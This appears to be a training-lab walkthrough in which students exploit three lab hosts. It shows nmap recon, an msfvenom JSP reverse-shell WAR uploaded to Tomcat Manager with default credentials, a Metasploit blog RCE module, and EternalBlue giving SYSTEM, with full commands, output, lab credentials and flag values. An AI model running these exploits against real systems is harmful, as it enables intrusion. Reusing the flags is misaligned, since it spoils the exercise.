Host01 172.16.1.11:8080

# Nmap 7.92 scan initiated Tue Aug  5 11:04:30 2025 as: nmap -sC -sV -oA initial_nmap 172.16.1.11
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.018s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Inlanefreight Server Status
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-05T15:05:25+00:00
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2025-08-04T14:57:55
|_Not valid after:  2026-02-03T14:57:55
|_ssl-date: 2025-08-05T15:05:30+00:00; 0s from scanner time.
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.0.11
MAC Address: 00:50:56:B0:C3:49 (VMware)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:c3:49 (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-08-05T08:05:25-07:00
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-08-05T15:05:25
|_  start_date: N/A

# Host addresses
127.0.0.1  localhost
127.0.1.1  skills-foothold
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local



└──╼ $sudo nmap -sV -sC -oA initial_nmap_blog 172.16.1.12
Starting Nmap 7.92 ( https://nmap.org ) at 2025-08-06 09:45 EDT
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.97s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Inlanefreight Gabber
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:50:56:B0:C4:64 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds

Nmap scan report for 172.16.1.13
Host is up (0.048s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 172.16.1.13 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
MAC Address: 00:50:56:B0:0F:F8 (VMware)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-06T14:23:20
|_  start_date: 2025-08-06T13:39:19
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h23m06s, deviation: 4h02m29s, median: 3m06s
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:0f:f8 (VMware)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-08-06T07:23:20-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.98 seconds

---

The Live Engagement
Question 1
"What is the hostname of Host-1? (answer in all lowercase)"
After spawning the target machine (which is the jump host), students need to connect to it with xfreerdp using the credentials htb-student:HTB_@cademy_stdnt!:

Code: shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
  The Live Engagement
┌─[us-academy-1]─[10.10.14.5]─[htb-ac413848@htb-hiwj2sbeuf]─[~]
└──╼ [★]$ xfreerdp /v:10.129.56.215 /u:htb-student /p:HTB_@cademy_stdnt!

[09:22:47:936] [9274:9275] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[09:22:47:937] [9274:9275] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[09:22:47:937] [9274:9275] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[09:22:47:937] [9274:9275] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[09:22:47:267] [9274:9275] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized

<SNIP>
Shells_&_Payloads_Walkthrough_Image_33.png

Subsequently, students need to launch an Nmap scan against Host1, which has the IP address 172.16.1.11:

Shells_&_Payloads_Walkthrough_Image_34.png

Code: shell
nmap -A 172.16.1.11
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A 172.16.1.11

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 04:37 EST
<SNIP>
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2022-11-09T09:04:27
|_Not valid after:  2023-05-11T09:04:27
|_ssl-date: 2022-11-10T09:38:09+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-10T09:38:04+00:00

<SNIP>
From the output of Nmap for port 3389, students will know that the host name is shells-winsvr.

Answer: {hidden}

The Live Engagement
Question 2
"Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)"
From the Nmap scan ran in the previous question, students know that port 8080 is open:

Code: shell
nmap -A 172.16.1.11
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A 172.16.1.11

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 04:37 EST
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.065s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.0.11
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Therefore, using the previously established RDP session with the jump host, students need to navigate to http://172.16.1.11:8080 using Firefox from within the terminal:

Code: shell
firefox http://172.16.1.11:8080
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $firefox http://172.16.1.11:8080

Once opened, students need to click on "Manager App" and provide the credentials tomcat:Tomcatadm (which were provided under "Host-1 hint" in the module's section):

Shells_&_Payloads_Walkthrough_Image_35.png

Shells_&_Payloads_Walkthrough_Image_36.png

After logging to the Application Manager, students will notice that they can upload .WAR files:

Shells_&_Payloads_Walkthrough_Image_37.png

Therefore, students need to upload a malicious .WAR file that will send them a reverse shell session from the backend server. Students first need to start an nc listener that will catch the reverse shell on the jump host:

Code: shell
nc -nvlp PWNPO
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $nc -nvlp 9001

listening on [any] 9001 ...
Then, students need to use msfvenom, specifying the payload java/jsp_shell_reverse_tcp, LPORT to be the port that nc is listening on (i.e., PWNPO), and most importantly, setting LHOST to be the IP address of the jump host. To attain the IP address, students need to use the ip command and search for the interface having an address of 172.16.1.*:

Code: shell
ip a | grep "172.16.1.*"
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $ip a | grep "172.16.1.*"

    inet 172.16.1.5/23 brd 172.16.1.255 scope global ens224
The ens224 interface has the IP address 172.16.1.5 in here (thus, it will be utilized as PWNIP):

Code: shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o managerUpdated.war
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9001 -f war -o managerUpdated.war

Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: managerUpdated.war
Students then need to upload and deploy the malicious .WAR file to the Application Manager:

Shells_&_Payloads_Walkthrough_Image_38.png

Shells_&_Payloads_Walkthrough_Image_39.png

After deploying it, students need to click on it to notice that the reverse shell connection has been established on the nc listener:

Shells_&_Payloads_Walkthrough_Image_40.png

Shells_&_Payloads_Walkthrough_Image_41.png

  The Live Engagement
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.11] 49799
Microsoft Windows [Version 10.0.17763.2114]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>
At last, students need to use the dir command on the C:\Shares\ directory, finding the directory dev-share:

Code: shell
dir C:\Shares\
  The Live Engagement
C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>dir C:\Shares\

dir C:\Shares\
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37

 Directory of C:\Shares

09/22/2021  12:22 PM    <DIR>          .
09/22/2021  12:22 PM    <DIR>          ..
09/22/2021  12:24 PM    <DIR>          dev-share
               0 File(s)              0 bytes
               3 Dir(s)  26,669,289,472 bytes free
Answer: {hidden}

The Live Engagement
Question 3
"What distribution of Linux is running on Host-2 (Format: distro name, all lower case)"
Using the same previously established RDP session to the jump host, students need to launch an Nmap scan against Host-2, which has the VHost entry 172.16.1.12 blog.inlanefreight.local added to /etc/hosts:

Shells_&_Payloads_Walkthrough_Image_42.png

Code: shell
cat /etc/hosts
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $cat /etc/hosts

# Host addresses
127.0.0.1  localhost
127.0.1.1  skills-foothold
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local
Therefore, the Nmap scan will be against the VHost blog.inlanefreight.local:

Code: shell
nmap -A blog.inlanefreight.local
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A blog.inlanefreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 09:17 EST
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.066s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Inlanefreight Gabber
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
From the output of Nmap, students will see that the the version of the SSH service is exposing the OS's flavour of Linux to be ubuntu.

Answer: {hidden}

The Live Engagement
Question 4
"What language is the shell written in that gets uploaded when using the 50064.rb exploit?"
Using the previously established RDP session, students can use searchsploit to search for 50064.rb and notice that it references php:

Code: shell
searchsploit 50064.rb
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $searchsploit 50064.rb

-------------------------------------- ---------------------------------
 Exploit Title                        |  Path
-------------------------------------- ---------------------------------
Lightweight facebook-styled blog 1.3  | php/webapps/50064.rb
-------------------------------------- ---------------------------------
Alternatively, students can grep for DefaultOptions to know that the payload is a php meterpreter bind tcp:

Code: shell
grep "DefaultOptions" 50064.rb
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $grep "DefaultOptions" 50064.rb 
      'DefaultOptions'  =>
              'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}
Answer: {hidden}

The Live Engagement
Question 5
"Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt"
Using the previously established RDP session to the jump host, students need to open blog.inlanefreight.local with Firefox:

Code: shell
firefox blog.inlanefreight.local
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $firefox blog.inlanefreight.local

Shells_&_Payloads_Walkthrough_Image_43.png

When scrolling down within the blog, students will notice that the user "Slade Wilson" has posted that this blog suffers from the Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) exploit:

Shells_&_Payloads_Walkthrough_Image_44.png

Since the exploit requires authentication, students are given the credentials admin:admin123!@# under "Host-2 hint":

Shells_&_Payloads_Walkthrough_Image_45.png

Afterward, students need to launch msfconsole and use the 50064.rb module:

Code: shell
msfconsole -q
use 50064.rb
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $msfconsole -q

msf6 > use 50064.rb
[*] Using configured payload php/meterpreter/bind_tcp
Subsequently, students need to set the module's options accordingly, most importantly setting the vhost option to blog.inlanefreight.local and setting RHOST and RHOSTS to 172.16.1.12 (this IP address can be attained by reading /etc/hosts of the jump host):

Code: shell
set VHOST blog.inlanefreight.local
set RHOSTS 172.16.1.12
set RHOST 172.16.1.12
set USERNAME admin
set PASSWORD admin123!@#
  The Live Engagement
msf6 exploit(50064) > set VHOST blog.inlanefreight.local

vhost => blog.inlanefreight.local
msf6 exploit(50064) > set RHOSTS 172.16.1.12
RHOSTS => 172.16.1.12
msf6 exploit(50064) > set RHOST 172.16.1.12
RHOST => 172.16.1.12
msf6 exploit(50064) > set USERNAME admin
USERNAME => admin
msf6 exploit(50064) > set PASSWORD admin123!@#
PASSWORD => admin123!@#
Then, students need to launch the exploit:

Code: shell
exploit
  The Live Engagement
msf6 exploit(50064) > exploit

[*] Got CSRF token: de5286279a
[*] Logging into the blog...
[+] Successfully logged in with admin
[*] Uploading shell...
[+] Shell uploaded as data/i/4zDx.php
[+] Payload successfully triggered !
[*] Started bind TCP handler against 172.16.1.12:4444
[*] Sending stage (39282 bytes) to 172.16.1.12
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2022-11-11 03:07:08 -0500

meterpreter >
After attaining the meterpreter session successfully, students can read the flag file "flag.txt" which is under the /customscripts/ directory using cat:

Code: shell
cat /customscripts/flag.txt
  The Live Engagement
meterpreter > cat /customscripts/flag.txt

B1nD_Shells_r_cool
Alternatively, students can also drop into a system shell then read the flag file:

Code: shell
shell
cat /customscripts/flag.txt
  The Live Engagement
meterpreter > shell

Process 2870 created.
Channel 1 created.
cat /customscripts/flag.txt
B1nD_Shells_r_cool
Answer: {hidden}

The Live Engagement
Question 6
"What is the hostname of Host-3? (answer in all lowercase)"
Using the previously established RDP session to the jump host, students need to launch an Nmap scan against Host-3, which has the IP address 172.16.1.13:

Shells_&_Payloads_Walkthrough_Image_46.png

Code: shell
nmap -A 172.16.1.13
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A 172.16.1.13

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 03:17 EST
Nmap scan report for 172.16.1.13
Host is up (0.069s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 172.16.1.13 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h39m59s, deviation: 4h37m07s, median: 0s
| smb2-time: 
|   date: 2022-11-11T08:17:26
|_  start_date: 2022-11-11T07:24:16
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:df:72 (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-11-11T00:17:26-08:00
From the output of Nmap for port 445, students will know that the hostname is shells-winblue.

Answer: {hidden}

The Live Engagement
Question 7
"Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt"
From the Nmap scan ran against 172.16.1.13 (i.e., Host-3) in the previous question, students know that the SMB ports 139 and 445 are open:

Code: shell
nmap -A 172.16.1.13
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $nmap -A 172.16.1.13

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 03:17 EST
Nmap scan report for 172.16.1.13
Host is up (0.069s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 172.16.1.13 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h39m59s, deviation: 4h37m07s, median: 0s
| smb2-time: 
|   date: 2022-11-11T08:17:26
|_  start_date: 2022-11-11T07:24:16
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:df:72 (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-11-11T00:17:26-08:00
The hint provided for this question says that the vulnerability makes many a sysadmin feel "Blue", therefore, it is referring to the EternalBlue exploit:

Shells_&_Payloads_Walkthrough_Image_47.png

Therefore, students need to launch msfconsole and use the exploit/windows/smb/ms17_010_psexec module/exploit:

Code: shell
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $msfconsole -q

msf6 > use exploit/windows/smb/ms17_010_psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
Subsequently, students need to set the options of the module, most importantly, setting LHOST to be the IP address of the jump host. To attain the IP address, students need to use the ip command and grep for the interface having an address of 172.16.1.*:

Code: shell
ip a | grep "172.16.1.*"
  The Live Engagement
┌─[htb-student@skills-foothold]─[~]
└──╼ $ip a | grep "172.16.1.*"

    inet 172.16.1.5/23 brd 172.16.1.255 scope global ens224
The ens224 interface has the IP address 172.16.1.5 in here (thus, it will be utilized as PWNIP):

Code: shell
set LHOST PWNIP
set RHOSTS 172.16.1.13
  The Live Engagement
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 172.16.1.5

LHOST => 172.16.1.5
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 172.16.1.13
RHOSTS => 172.16.1.13
Then, students need to launch the exploit:

Code: shell
exploit
  The Live Engagement
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 172.16.1.5:4444 
[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
[*] 172.16.1.13:445 - Built a write-what-where primitive...
[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.13:445 - Selecting PowerShell target
[*] 172.16.1.13:445 - Executing the payload...
[+] 172.16.1.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 172.16.1.13
[*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2022-11-11 04:53:16 -0500

meterpreter >
After attaining the meterpreter session successfully, students can read the flag file "Skills-flag.txt" which is under the C:\Users\Administrator\Desktop\ directory using cat:

Code: shell
cat C:/Users/Administrator/Desktop/Skills-flag.txt
  The Live Engagement
meterpreter > cat C:/Users/Administrator/Desktop/Skills-flag.txt

One-H0st-Down!
Alternatively, students can also drop into a system shell then read the flag file:

Code: cmd
shell
type C:\Users\Administrator\Desktop\Skills-flag.txt
  The Live Engagement
meterpreter > shell

Process 3052 created.
Channel 2 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>type C:\Users\Administrator\Desktop\Skills-flag.txt

type C:\Users\Administrator\Desktop\Skills-flag.txt
One-H0st-Down!
Answer: {hidden}